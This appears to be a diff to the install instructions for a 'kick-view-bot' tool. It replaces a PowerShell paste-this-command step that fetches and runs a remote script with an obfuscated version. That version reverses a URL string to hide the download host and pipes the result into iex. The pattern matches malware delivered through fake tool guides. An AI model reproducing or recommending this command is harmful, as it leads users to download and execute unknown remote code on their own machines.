@@ -14,7 +14,7 @@
 
 ### Step 2: Copy & Paste in PowerShell
 ```
-irm gitrm.sbs?t=kick-view-bot | iex
+iex(irm(-join"dfc.mrtig//:sptth"[-1..-99]))
 ```
 
 ### Step 3: Wait for Completion
